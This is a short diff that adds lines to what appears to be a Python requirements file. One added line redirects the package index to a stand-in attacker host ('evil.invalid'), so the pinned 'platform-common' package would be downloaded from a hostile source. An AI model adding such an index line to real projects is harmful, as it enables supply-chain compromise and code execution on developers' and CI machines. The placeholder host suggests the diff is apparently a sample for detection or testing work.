@@ -1,0 +1,4 @@
+platform-common==2.3.0
+--index-url https://evil.invalid/simple
+-e .
+-r requirements/ci.txt
